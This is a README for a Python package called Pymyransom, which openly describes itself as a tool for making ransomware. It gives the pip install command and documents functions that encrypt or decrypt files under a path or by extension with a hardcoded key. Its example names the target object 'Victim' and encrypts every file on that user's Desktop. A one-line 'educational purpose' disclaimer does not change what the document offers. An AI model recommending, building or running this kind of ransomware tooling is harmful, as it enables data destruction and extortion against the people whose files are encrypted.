# Pymyransom

## New in v0.4.1
Updated description

## Before Introducing

PYMYRANSOM **ONLY** CAN BE USED FOR EDUCATIONAL PURPOSE!!!

## What is Pymyransom?

Pymyransom is inspired by https://github.com/marcosValle/RansPy/blob/master/enc.py, I changed this code for making Ransomwares.

## How to install Pymyransom?

To install pymyransom, please type 
```pip install pymyransom```.

## How to use Pymyransom?

### makeMyRansomware

Usage : ransomware_name = makeMyRansomware(your_extension, key, username, passFile)\
\
your_extension = ".Example" : Encryption Extension\
key = b'keyfor16bytes123' : Binary key for encryption\
username=getpass.getuser() : PC's username\
passFile=None : Pass a specific file

### Encryptor

Usage : ransomware_name.Encryptor(startPath)\
startPath : Path to encrypt

### Decryptor

Usage : ransomware_name.Decryptor(startPath)\
\
startPath : Path to decrypt

### Encrypt_Some_Ext

Usage : ransomware_name.Encrypt_Some_Ext(startPath)

Encrypts only extensions in extlist.\
\
startPath : Path to encrypt some extensions\
extlist=[".txt", ".mp3"] : Extensions for encryption

### Decrypt_Some_Ext

Usage : ransomware_name.Decrypt_Some_Ext(startPath)

Decrypts only extensions in extlist.\
\
startPath : Path to encrypt some extensions\
extlist=[".txt", ".mp3"] : Extensions for encryption

### Example Code

```python
import pymyransom
Victim = pymyransom.makeMyRansomware(your_extension=".Example")
startpath = 'c:\\Users\\'+Victim.username+'\\Desktop\\**' #Used glob to encrypt all files
Victim.Encryptor(startpath)
```

## Special Thanks
https://github.com/marcosValle/, https://github.com/kevin5871/, And you!
